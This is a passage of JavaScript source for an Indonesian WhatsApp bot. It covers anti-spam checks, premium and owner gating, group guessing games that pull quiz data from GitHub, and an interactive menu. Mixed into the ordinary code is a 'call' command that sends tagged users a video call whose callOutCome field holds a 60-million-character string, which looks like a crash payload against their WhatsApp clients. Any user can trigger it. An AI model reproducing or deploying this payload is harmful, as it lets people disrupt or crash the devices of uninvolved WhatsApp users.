console.log(chalk.bgYellowBright(color("[  SPAM  ]", "black")),"antispam Case aktif")
return
}

//ANTI SPAM PRIVATE CHAT
if (isAntiSpam && isCmd && msgFilter.isFiltered(from) && !isGroup && !itsMe && !isOwner ) {
addSpam("Case",senderNumber, "3s", AntiSpam)
addSpammer(senderNumber, spammer)
return setReply("Beri bot waktu jeda 5 detik")
}

//ANTI SPAM GROUP CHAT     
if (isAntiSpam && isCmd && msgFilter.isFiltered(from) && isGroup && !itsMe && !isOwner) {
addSpam("Case",senderNumber, "5s", AntiSpam)
addSpammer(senderNumber, spammer)
return setReply("Beri bot waktu jeda 5 detik")
}
if (isCmd && !isOwner) msgFilter.addFilter(from)

//AUTO BLOCK CMD
for (let i = 0; i < listcmdblock.length ; i++) {
if (command === listcmdblock[i].cmd ){
if(autoblockcmd) {
return setReply(mess.block.Bsystem)
} else{
return setReply(mess.block.Bowner)
}
}
}

//FITUR USER PREMIUM
if(!checkDataName("premium", "", DataId)) { 
await createDataId("premium", DataId) 
}
let userPremium =  DataId.filter(item => item.name == "premium" )
for(let i of userPremium[0].id){
if(command == i && !isPremium) return onlyPrem()
}

//FITUR KHUSUS OWNER
if(!checkDataName("commands", "", DataId)) { 
await createDataId("commands", DataId) 

}

let ownerCommands =  DataId.filter(item => item.name == "commands" )
for(let i of ownerCommands[0].id){
if(command == i && !isOwner) return onlyOwner()
} 
    
  //FITUR USER LIMIT
if(!checkDataName("limit", "", DataId)) {
await createDataId("limit", DataId)
}
let userLimit =  DataId.filter(item => item.name == "limit" )
for(let i of userLimit[0].id){
if(!isOwner && command == i ){
if(!isPremium && db.data.users[sender].limit < 1) return onlyLimit()
if (!user.registered) return sendDaftar()
if(!isPremium && isGroup && q) {
db.data.users[sender].limit -= 1
hanz.sendMessage(from,{text:`✅ Limit kamu tersisa ${user.limit}`}, {quoted: m})
}

}
}
// =========== FUNCTION GAME ===========//
const salahGame = ["❌", "🙈", "🤦", "❎"];
const emotSalah = pickRandom(salahGame);
let teksHampirBenar = [
            `🤏 *Dikit Lagi!* Kamu hampir berhasil, coba lagi!`,
            `🧐 Hmm, sudah hampir benar! Ayo coba sekali lagi.`,
            `⏳ *Sedikit Lagi!* Jawabanmu hampir benar, ayo lanjutkan!`
        ];
        let hampirBenar = pickRandom(teksHampirBenar);
// GAME SUSUNKATA 
hanz.susunkata = hanz.susunkata ? hanz.susunkata : {};
hanz.susunkataCooldown = hanz.susunkataCooldown ? hanz.susunkataCooldown : {};

if (isGroup && from in hanz.susunkata) {
    const cooldownTime = 5000; 
    const threshold = 0.72; 
    const id = m.chat;
    const gameData = hanz.susunkata[id];
    const json = JSON.parse(JSON.stringify(gameData[1]));
    if (hanz.susunkataCooldown[id]) {
        let lastInteraction = hanz.susunkataCooldown[id];
        if (new Date() - lastInteraction < cooldownTime) {
            return; 
        }
    }
    hanz.susunkataCooldown[id] = new Date(); 
    if (budy.toLowerCase() === json.jawaban.toLowerCase().trim()) {
        user.balance += gameData[2]; 
        user.exp += 999; 
        const successResponses = [
            `${gris1}🎉 *Benar!* Kamu jenius! 💡\n+${gameData[2]} Balance 💸\n+999 EXP 📈${gris1}`,
            `${gris1}✨ *Jawaban tepat!* Hebat sekali! 🌟\n+${gameData[2]} Balance 💵\n+999 EXP 🆙${gris1}`,
            `${gris1}🔥 *Sempurna!* Kamu berhasil! 🏆\n+${gameData[2]} Balance 💸\n+999 EXP 🌠${gris1}`
        ];
        const chosenResponse = pickRandom(successResponses);
        reply(chosenResponse); 
        clearTimeout(gameData[3]); 
        delete hanz.susunkata[id]; 
    } 
    else if (similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) {
         reply(hampirBenar); 
    } 
    else {
  sendReact(emotSalah)      
     
    }
}   
// TEKA TEKI
hanz.tekateki = hanz.tekateki || {}; 
hanz.tekatekiCooldown = hanz.tekatekiCooldown || {}; 
if (isGroup && from in hanz.tekateki) {
    if (!isGroup) return; 
    const threshold = 0.72; 
    let id = m.chat;
    let json = JSON.parse(JSON.stringify(hanz.tekateki[id][1]));
    if (hanz.tekatekiCooldown[id]) {
        let lastInteraction = hanz.tekatekiCooldown[id];
        if (new Date() - lastInteraction < 5000) {
            return; 
        }
    }
    hanz.tekatekiCooldown[id] = new Date();
    if (budy.toLowerCase() === json.jawaban.toLowerCase().trim()) {
        user.balance += hanz.tekateki[id][2];
        let correctReplies = [
            `${gris1}🎉 *GAME TEKA-TEKI*\n\nJawaban Kamu Benar! 🎊\n\nHadiah: +${hanz.tekateki[id][2]} Balance 💸\nExp: +999🆙${gris1}`,
            `${gris1}🔥 *GAME TEKA-TEKI*\n\nLuar biasa! Kamu berhasil! 💪\n\nBonus: +${hanz.tekateki[id][2]} Balance 💵\nExp: +999📈${gris1}`,
            `${gris1}✨ *GAME TEKA-TEKI*\n\nKamu jago! Jawaban benar! 🎯\n\nBonus: +${hanz.tekateki[id][2]} Balance 💸\nExp: +999🆙${gris1}`
        ];
        let replyCorrect = pickRandom(correctReplies);
        reply(replyCorrect); 
        clearTimeout(hanz.tekateki[id][3]);
        delete hanz.tekateki[id]; 
    } 
    else if (similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) {
        
        reply(hampirBenar);
    } 
    else {
      sendReact(emotSalah) 
    }
}
/*/GAME Tebak Bendera Function
 hanz.tebakbendera ? hanz.tebakbendera : {}  
if(isGroup && from in hanz.tebakbendera){
const threshold = 0.72
let id = from

 let json = JSON.parse(JSON.stringify(hanz.tebakbendera[id][1]))
 if (budy.toLowerCase() == json.name.toLowerCase().trim()) {
user.balance += hanz.tebakbendera[id][2]
let tebkTbenra =`${gris1}*TEBAK BENDERA*

Jawaban Kamu Benar!
Bonus Saldo : +${hanz.tebakbendera[id][2]}
Exp : +999${gris1}`
setReply(tebkTbenra)
 clearTimeout(hanz.tebakbendera[id][3])
 delete hanz.tebakbendera[id]
 } else if(similarity(budy.toLowerCase(), json.name.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
 else {
      sendReact(emotSalah) 
    }
}*/
// TEBAK KIMIA
hanz.tebakkimia = hanz.tebakkimia ? hanz.tebakkimia : {}  
if(isGroup && from in hanz.tebakkimia){
if(!isGroup) {return} 
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(hanz.tebakkimia[id][1]))
 let isSurender = /^((me)?nyerah|surr?ender)$/i.test(budy)
 if (budy.toLowerCase() == json.lambang.toLowerCase().trim()) {
user.balance += hanz.tebakkimia[id][2]
 global.db.data.users[m.sender].exp += 10
   let tebkKmia = `${gris1}*GAME TEBAK KIMIA*\n\nJawaban Kamu Benar!\n Hadiah : +${hanz.tebakkimia[id][2]} Balance 💸${gris1}`
setReply(tebkKmia)
 clearTimeout(hanz.tebakkimia[id][3])
 delete hanz.tebakkimia[id]
 } else if(similarity(budy.toLowerCase(), json.lambang.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
else {
      sendReact(emotSalah) 
    }
}
// CAK LONTONG
hanz.caklontong = hanz.caklontong ? hanz.caklontong : {}  
if(isGroup && from in hanz.caklontong){
if(!isGroup) {return} 
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(hanz.caklontong[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
 global.db.data.users[m.sender].exp += hanz.caklontong[id][2]
 let ckLntg = `${gris1}*GAME CAKLONTONG*\n*Benar!*\n+${hanz.caklontong[id][2]} XP\n+1500 Money\n${json.deskripsi}${gris1}`
setReply(ckLntg)
 clearTimeout(hanz.caklontong[id][3])
 delete hanz.caklontong[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
else {
      sendReact(emotSalah) 
    }
}
  // TEBAK LAGU
hanz.tebaklagu = hanz.tebaklagu ? hanz.tebaklagu : {}  
if(isGroup && from in hanz.tebaklagu){
if(!isGroup) {return} 
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(hanz.tebaklagu[id][1]))
 if (budy.toLowerCase() == json.judul.toLowerCase().trim()) {
user.balance += hanz.tebaklagu[id][2]
 let tbkLgu = `${gris1}*GAME TEBAK LAGU*\n\nJawaban Kamu Benar!\n Hadiah : +${hanz.tebaklagu[id][2]} Balance 💸${gris1}`
   reply (tbkLgu)
 clearTimeout(hanz.tebaklagu[id][3])
 delete hanz.tebaklagu[id]
 } else if(similarity(budy.toLowerCase(), json.judul.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
else {
      sendReact(emotSalah) 
    }
}
// TEBAK TEBAKAN
hanz.tebaktebak = hanz.tebaktebak ? hanz.tebaktebak : {}  
if(isGroup && from in hanz.tebaktebak){
if(!isGroup) {return} 
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(hanz.tebaktebak[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += hanz.tebaktebak[id][2]
 global.db.data.users[m.sender].exp += 50
let tebkTbk = `${gris1}*GAME TEBAK TEBAKAN*\n\nJawaban Kamu Benar!\n Hadiah : +${hanz.tebaktebak[id][2]} Balance 💸\n EXP: +50${gris1}`
reply (tebkTbk)
   clearTimeout(hanz.tebaktebak[id][3])
 delete hanz.tebaktebak[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
else {
      sendReact(emotSalah) 
    }
}
  // TEBAKKATA
hanz.tebakkata = hanz.tebakkata ? hanz.tebakkata : {}  
if(isGroup && from in hanz.tebakkata){
if(!isGroup) {return} 
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(hanz.tebakkata[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += hanz.tebakkata[id][2]
 var teks6 = `${gris1}*GAME TEBAK KATA*\n\nJawaban Kamu Benar!\n Hadiah : +${hanz.tebakkata[id][2]} Balance 💸${gris1}`
   reply (teks6)
 clearTimeout(hanz.tebakkata[id][3])
 delete hanz.tebakkata[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
else {
      sendReact(emotSalah) 
    }
}
// TEBAK LIRIK
hanz.tebaklirik = hanz.tebaklirik ? hanz.tebaklirik : {}  
if(isGroup && from in hanz.tebaklirik){
if(!isGroup) {return} 
const threshold = 0.72
let id = m.chat
let json = JSON.parse(JSON.stringify(hanz.tebaklirik[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += hanz.tebaklirik[id][2]
 global.db.data.users[m.sender].exp += 10
   var teks7 = `${gris1}*GAME TEBAK LIRIK*\n\nJawaban Kamu Benar!\n Hadiah : +${hanz.tebaklirik[id][2]} Balance 💸\n EXP: +10${gris1}`
   reply (teks7)
 clearTimeout(hanz.tebaklirik[id][3])
 delete hanz.tebaklirik[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
else {
      sendReact(emotSalah) 
    }
}
 // SIAPAKAH AKU
hanz.siapaaku = hanz.siapaaku ? hanz.siapaaku : {}
if(isGroup && from in hanz.siapaaku){
if(!isGroup) {return} 
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(hanz.siapaaku[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += hanz.siapaaku[id][2]
let spaAku = `${gris1}*GAME SIAPAKAH AKU*\n\nJawaban Kamu Benar!\n Hadiah : +${hanz.siapaaku[id][2]} Balance 💸${gris1}`
 setReply(spaAku)
 clearTimeout(hanz.siapaaku[id][3])
 delete hanz.siapaaku[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
else {
      sendReact(emotSalah) 
    }
}
  // TEBAK GAMBAR
hanz.tebakgambar = hanz.tebakgambar ? hanz.tebakgambar : {}  
if(isGroup && from in hanz.tebakgambar){
if(!isGroup) {return} 
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(hanz.tebakgambar[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += hanz.tebakgambar[id][2]
let bnarGmbar = `${gris1}*GAME TEBAK GAMBAR*\n\nJawaban Kamu Benar!\n Hadiah : +${hanz.tebakgambar[id][2]} Balance 💸${gris1}`
reply(bnarGmbar)
 clearTimeout(hanz.tebakgambar[id][3])
 delete hanz.tebakgambar[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
    else {
      sendReact(emotSalah) 
    }
}
//Game Family 100
hanz.family = hanz.family ? hanz.family : {}
if(isGroup && from in hanz.family){
if(!isGroup) {return} 
let threshold = 0.72 
let id =  m.chat
let room = hanz.family[id]
let textG = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurrender = /^((me)?nyerah|surr?ender)$/i.test(budy)
if (!isSurrender) {
let index = room.jawaban.indexOf(textG)
if (index < 0) {
if (Math.max(...room.jawaban.filter((_, index) => !room.terjawab[index]).map(jawaban => similarity(jawaban, textG))) >= threshold) return setReply('Dikit lagi!')
 }
if (!isCmd && room.terjawab[index]) {return} 
user.balance += room.winScore
room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `${gris1}*GAME FAMILY100*

*Soal:* ${room.soal}

Terdapat ${room.jawaban.length} jawaban${room.jawaban.find(v => v.includes(' ')) ? `
(beberapa jawaban terdapat spasi)
`: ''}
${isWin ? `*SEMUA JAWABAN TERJAWAB ✅*` : isSurrender ? '*MENYERAH ❌*' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
 return isSurrender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '✓ ' + room.terjawab[index].split('@')[0]  : ''}`.trim() : false
 }).filter(v => v).join('\n')}

${isSurrender ? '' : `+${room.winScore} Money tiap jawaban benar`}
     ${gris1}`.trim()
hanz.sendMessage(from, {text: `${caption}`, mentions: [room.terjawab + '@s.whatsapp.net']}, {quoted: m}).then(msg => {
 hanz.family[id].msg = msg
}).catch(_ => _)
if (isWin || isSurrender) delete hanz.family[id] 

}
// ========= BATAS FUNCTION ============\\
try{
switch(command) {
        
// ========== FITUR  TOP UP ========//
case 'tesmenu': {
    const menuText = `
Yo, I’m ! My job is to help out  and I’m built using *CJS x plugin* code.
I’m always ready to help whenever you need me. Start by checking the menu—just type \`.allmenu\`. Thanks!
			
*Info Bot*  
破 Creator : 
破 Runtime : 
破 Mode Bot : 
			
\`\`\`破 SIMPLE MENU\`\`\`
⚡︎ Allmenu
⚡︎ Aimenu
⚡︎ Nsfwmenu
⚡︎ Groupmenu
⚡︎ Storemenu
			
\`\`\`破 FUN MENU\`\`\`
⚡︎ Rpgmenu
⚡︎ Stalkmenu
⚡︎ Animemenu
⚡︎ Searchmenu
⚡︎ Downloadmenu
			
\`\`\`破 PANEL MENU\`\`\`
⚡︎ Vpsmenu
⚡︎ Panelmenu`;

    try {
        // Sections for the interactive buttons
        let sections = [
            {
                title: 'All menu hanz ( All )',
                highlight_label: 'Allmenu',
                rows: [
                    {
                        title: 'All menu',
                        description: 'Displays All menu ( Allmenu )',
                        id: '.allmenu'
                    }
                ]
            },
            {
                title: 'Populer menu ( List menu )',
                highlight_label: 'hanz - Neroxz',
                rows: [
                    { title: 'Ai Feature', description: 'Displays menu AI ( List menu )', id: '.downloadmenu' },
                    { title: 'Vps Feature', description: 'Displays menu VPS ( Menu VPS )', id: '.vpsmenu' },
                    { title: 'Panel Feature', description: 'Displays menu Panel ( Menu Panel )', id: '.panelmenu' },
                    { title: 'Download Feature', description: 'Displays menu Download ( Chat Botz Ai )', id: '.simenu' }
                ]
            },
            {
                title: 'System Information ( info )',
                highlight_label: 'CONTACT ADMIN',
                rows: [
                    { title: 'Creator Bot', description: 'Bot owner info, who created it ( information )', id: '.owner' },
                    { title: 'Sewa & Premium', description: 'Displays Rental and Premium List ( Buying )', id: '.sewabot' }
                ]
            }
        ];

        // Interactive message with buttons
        let listMessage = {
            title: '「 List Menu 」',
            sections,
        };

        // Sending interactive message
        await hanz.relayMessage(
            from,
            {
                interactiveMessage: {
                    header: { hasMediaAttachment: false },
                    body: { text: "Nerox - Z" },
                    carouselMessage: {
                        cards: [
                            {
                                header: {
                                    imageMessage: {
                                        url: "https://pomf2.lain.la/f/lb7pexoy.jpg",
                                        mimetype: "image/jpeg",
                                        height: 1080,
                                        width: 1080
                                    },
                                    hasMediaAttachment: true
                                },
                                body: { text: menuText },
                                nativeFlowMessage: {
                                    buttons: [
                                        {
                                            name: "single_select",
                                            buttonParamsJson: JSON.stringify(listMessage)
                                        }
                                    ]
                                }
                            }
                        ]
                    }
                }
            },
            {},
            { messageId: null }
        );
    } catch (error) {
        console.error("Error while sending menu:", error);
        return m.reply("Terjadi kesalahan saat menampilkan menu. Coba lagi nanti.");
    }
    break;
}
// ============== FITUR BUG ===========//

 // ======== FITUR INFO =========//
 
// =≠≠====== FITUR GROUP ===========//

// ========== FITUR KEAMANAN ========//

// ========== FITUR DOWNLOAD =========//

// ========== FITUR AI ===========//



        
case 'chat': {
   
if (!isOwner) return onlyOwner() 
    
  if (!args[0] || !args[1]) return m.reply(`Gunakan: *${prefix}chat nomor|pesan*\nContoh: *${prefix}chat 81234567890|Hai, apa kabar?*`);
const activeReplies = {};
  
  let [target, ...pesanConfessArray] = args.join(' ').split('|');
  let pesanConfess = pesanConfessArray.join('|').trim();

  
  if (!target || !pesanConfess) throw `Format salah! Gunakan: *${prefix}chat nomor|pesan*\nContoh: *${prefix}chat 81234567890|Hai, apa kabar?*`;

  
  let nomor = target.replace(/[^0-9]/g, ''); 
  nomor += '@s.whatsapp.net';
  try {
    await hanz.sendMessage(nomor, { text: pesanConfess }, { quoted: m });
    hanz.sendText(m.chat, `Pesan berhasil dikirim ke ${target}.\n\n*Pesan:* ${pesanConfess}`, m);
  } catch (err) {
    hanz.sendText(m.chat, `Gagal mengirim pesan ke ${target}. Pastikan nomor benar.\n\n*Error:* ${err}`, m);
    return;
  }

  
  if (!activeReplies[nomor]) {
    activeReplies[nomor] = m.chat; 
    hanz.ev.on('messages.upsert', async (chatUpdate) => {
      try {
        if (!chatUpdate.messages) return;
        let msg = chatUpdate.messages[0];

        
        if (msg.key.remoteJid !== nomor || msg.key.fromMe) return;

        
        let balasan = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
        if (balasan) {
          hanz.sendText(activeReplies[nomor], `*Balasan dari ${target}:*\n\n${balasan}`, m);
        }

       
        delete activeReplies[nomor];
      } catch (err) {
        console.error('Error handling reply:', err);
      }
    });
  } else {
  
    hanz.sendText(m.chat, `Sedang menunggu balasan dari ${target}...`, m);
  }
}
break;
  
case 'call': {
    if (args.length < 1) {
        return m.reply(`Pilih:\n${prefix + command} @tag\n\n${prefix + command} grup`);
    }

    if (m.mentionedJid.length !== 0) {
        for (let i = 0; i < m.mentionedJid.length; i++) {
            await hanz.offerCall(m.mentionedJid[i], {isVideo: true, callOutCome: "8".repeat(60000000)})             
            hanz.sendMessage(m.chat, { text: `Done` }, { quoted: m });
        }
    } else {
        await hanz.offerCall(sender, {isVideo: true, callOutCome: "8".repeat(60000000)})
        hanz.sendMessage(m.chat, { text: `menelpon grup` }, { quoted: m });
    }
}
break
  

            

 
 //===≠===== FITUR ANIME ===========//
 
// ========== FITUR TOOLS =========//

// ========= FITUR SHORT URL ========= //

// ========= FITUR SEARCH ============//
 
// =========== FITUR ISLAMIC =========//

 // ======== FITUR STIKER =========//
            
// =========== FITUR FUN ======≠=====//
               
// =≠===≠=== FITUR  NSFW ========= //
  
// =≠===== FITUR EPHOTO ==≠===== //
 
// ====== FITUR TEXTPRO ======== //

// =≠====== FITUR PRIMBON ========//

// ==≠======= FITUR CONVERT ======== //

// ========== FITUR GAME ==========//
case 'susunkata': {
    if (!isGame) return replyDoc(mess.game); 
    if (!isGroup) return; 
    if (!isPremium && global.db.data.users[sender].glimit < 1) {
        return setReply(mess.limit); 
    }
    let poin = 1000; 
    let timeout = 120000; 
    let id = m.chat;
    if (id in hanz.susunkata) {
        return setReply('Masih ada soal belum terjawab di chat ini.');
    }
    try {
        let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')).json();
        let json = src[Math.floor(Math.random() * src.length)]; 
        let caption = 
            `*🎮 GAME SUSUN KATA 🎮*\n\n` +
            `*Soal :* ${json.soal}\n` +
            `*Tipe :* ${json.tipe}\n\n` +
            `⏱ *Timeout:* ${(timeout / 1000).toFixed(2)} detik\n` +
            `🎁 *Exp:* +999\n` +
            `💸 *Bonus:* +${poin} Balance\n`.trim()
        ;
        hanz.susunkata[id] = [
            await setReply(caption), 
            json, 
            poin, 
            setTimeout(async () => {
                // Kirim stiker
                await sendSticker( 'https://pomf2.lain.la/f/wjw7ptlr.webp');
                // Kirim teks setelah stiker
                await m.reply(
                    `⏱ *Waktu habis!*\n` +
                    `Jawaban yang benar adalah: *${json.jawaban}*`
                );
                delete hanz.susunkata[id]; 
            }, timeout),
        ];
        db.data.users[sender].glimit -= 1;
        m.reply('1 limit game Anda telah terpakai.');
    } catch (err) {
        console.error(err); 
    }
}
break; 
case 'tekateki': {
    if (!isGame) return replyDoc(mess.game); 
    if (!isGroup) return;
    if (!isPremium && global.db.data.users[sender].glimit < 1) return onlyGlimit();

    let poin = 1000; 
    let timeout = 120000; 
    let id = m.chat;
    if (id in hanz.tekateki) {
        return reply('Masih ada soal belum terjawab di chat ini.');
    }

  
    let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')).json();
    let json = src[Math.floor(Math.random() * src.length)]; 

    let caption = `
*Soal :* ${json.soal}

Timeout: *${(timeout / 1000).toFixed(2)} detik*
Exp: +999
Bonus: +${poin} Balance
`.trim();
 
    hanz.tekateki[id] = [
        await reply(caption),
        json,
        poin,
        setTimeout(async () => {
            if (hanz.tekateki[id]) {
await sendSticker( 'https://pomf2.lain.la/f/wjw7ptlr.webp');
 await reply(`Waktu game telah habis.\nJawabannya adalah: ${json.jawaban}`);
                delete hanz.tekateki[id];
            }
        }, timeout),
    ];

 
    db.data.users[sender].glimit -= 1;
    m.reply('1 limit game Anda telah terpakai.');
}
break;
case 'tebakbendera':{
if (!isGame) return setReply(mess.game)
if (!isGroup) return;
if (!isPremium && global.db.data.users[sender].glimit < 1) return onlyGlimit()
let poin = 1000
let timeout = 120000
let id = m.chat
if (id in hanz.tebakbendera) return setReply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let teks = Ehztext(`Bendera Apakah Ini ?\n
Timeout *${(timeout / 1000).toFixed(2)} detik*
Exp : +999
Bonus : +${poin} Balance`.trim())
hanz.tebakbendera[id] = [
hanz.sendImage(from, json.img , teks, m),
json,
setTimeout(async () => {
if (hanz.tebakbendera[id]) 
 sendSticker( 'https://pomf2.lain.la/f/wjw7ptlr.webp');
await reply(`Waktu game telah habis
Jawabannya adalah : ${json.name}`)  
delete hanz.tebakbendera[id]
 }, timeout)
 ]
db.data.users[sender].glimit -= 1;
    m.reply('1 limit game Anda telah terpakai.');
}
break
case 'caklontong':{
if (!isGame) return setReply(mess.game)
if (!isGroup) return;
if (!isPremium && global.db.data.users[sender].glimit < 1) return onlyGlimit()
let poin = 3000
let timeout = 120000
let tiketcoin = 1
let id = m.chat
if (id in hanz.caklontong) return setReply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = `*Soal :* ${json.soal}\n\n
Timeout *${(timeout / 1000).toFixed(2)} detik*
Bonus : +${poin}
Tiketcoin : +${tiketcoin} `.trim()
hanz.caklontong[id] = [
await setReply(caption),
json, poin,
setTimeout(async () => {
sendSticker( 'https://pomf2.lain.la/f/wjw7ptlr.webp')
await reply(`Waktu game telah habis
Jawabannya adalah : ${json.jawaban}

${json.deskripsi}`)  
delete hanz.caklontong[id]
 }, timeout)
 ]
db.data.users[sender].glimit -= 1;
    m.reply('1 limit game Anda telah terpakai.');
}
break
case 'tebakkimia':{
if (!isGame) return setReply(mess.game)
    if (!isPremium && global.db.data.users[sender].glimit < 1) return onlyGlimit()
if (!isGroup) return;
	let timeout = 40000
	let poin = 1000
	let id = m.chat
	if (id in hanz.tebakkimia) return setReply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `*TEBAK KIMIA*
	Unsur: ${json.unsur}
	Soal: Singkatan atau lambang di atas adalah...
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Balance
	`.trim()
	hanz.tebakkimia[id] = [
	await setReply(caption),
	json, poin,
	setTimeout(async () => {
	if (hanz.tebakkimia[id]) 
user.balance -= 200
sendSticker( 'https://pomf2.lain.la/f/wjw7ptlr.webp')
await reply(`*GAME TEBAK KIMIA*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Balance kamu dikurangi 200\n𖦹 Sisa Balance kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete hanz.tebakkimia[id]
	 }, timeout)
	 ]
	
    db.data.users[sender].glimit -= 1;
    m.reply('1 limit game Anda telah terpakai.');
        }
	break
 case 'tebakkata':{
  if (!isGame) return setReply(mess.game)
if (!isGroup) return onlyToko()
if (!isPremium && global.db.data.users[sender].glimit < 1) return onlyGlimit()
let poin = 1000
let timeout = 120000
let id = m.chat
if (id in hanz.tebakkata) return setReply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = `*Soal :* ${json.soal}

Timeout *${(timeout / 1000).toFixed(2)} detik*
Exp : +999
Bonus : +${poin} Balance`.trim()
hanz.tebakkata[id] = [
await setReply(caption),
json, poin,
setTimeout(async () => {
if (hanz.tebakkata[id]) 
sendSticker( 'https://pomf2.lain.la/f/wjw7ptlr.webp')
await reply(`Waktu game telah habis
Jawabannya adalah : ${json.jawaban}`)
delete hanz.tebakkata[id]
 }, timeout)
 ]

db.data.users[sender].glimit -= 1;
    m.reply('1 limit game Anda telah terpakai.');
     }
break
 case 'tebaklirik':{
if (!isGame) return setReply(mess.game)
if (!isGroup) return;
if (!isPremium && global.db.data.users[sender].glimit < 1) return onlyGlimit()
let poin = 1000
let timeout = 120000
let id = m.chat
if (id in hanz.tebaklirik) return setReply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = `*Soal :* ${json.soal}

Timeout *${(timeout / 1000).toFixed(2)} detik*
Exp : +999
Bonus : +${poin} Balance`.trim()
hanz.tebaklirik[id] = [
await setReply(caption),
json, poin,
setTimeout(async () => {
if (hanz.tebaklirik[id]) 
sendSticker( 'https://pomf2.lain.la/f/wjw7ptlr.webp')
await reply(`Waktu game telah habis
  Jawabannya adalah : ${json.jawaban}`)  
delete hanz.tebaklirik[id]
 }, timeout)
 ]
db.data.users[sender].glimit -= 1;
    m.reply('1 limit game Anda telah terpakai.');
}
break
case 'tebaklagu':{
    if (!isGame) return setReply(mess.game)
if (!isGroup) return ;
	let timeout = 60000
	let poin = 1200
	let id = m.chat
	if (id in hanz.tebaklagu) return setReply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/qisyana/scrape/main/tebaklagu.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]    
 var lagu = await hanz.sendMessage(from, {audio: {url: `${json.lagu}`, ptt: true, mimetype: 'audio/mpeg'}}, { quoted: m })
	let caption = `${gris1}*TEBAK LAGU*
	Artis: ${json.artis}
	Soal: Judul lagu di atas adalah...
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Balance${gris1}
	`.trim()
	hanz.tebaklagu[id] = [
		await hanz.sendMessage(from, {text: caption}, {quoted: m}),
	json, poin,
	setTimeout(async () => {
	if (hanz.tebaklagu[id]) 
     user.balance -= 200
let tbkLgu = `${gris1}*GAME TEBAK LAGU*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.judul}*\n𖦹 Balance kamu dikurangi 200\n𖦹 Sisa Balance kamu: *${db.data.users[sender].balance.toLocaleString()}*${gris1}`
sendSticker( 'https://pomf2.lain.la/f/wjw7ptlr.webp')
await reply(tbkLgu)
	delete hanz.tebaklagu[id]
	 }, timeout)
	 ]
	
    db.data.users[sender].glimit -= 1;
    m.reply('1 limit game Anda telah terpakai.');
    }
	break
case 'tebakgambar':{
  if (!isGame) return setReply(mess.game)
if (!isGroup) return;
if (!isPremium && global.db.data.users[sender].glimit < 1) return onlyGlimit()
let poin = 1000
let timeout = 120000
let id = m.chat
if (id in hanz.tebakgambar) return setReply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let kentir = await getBuffer(json)       
let teks = Ehztext(`*Soal :* ${json.deskripsi}

Timeout *${(timeout / 1000).toFixed(2)} detik*
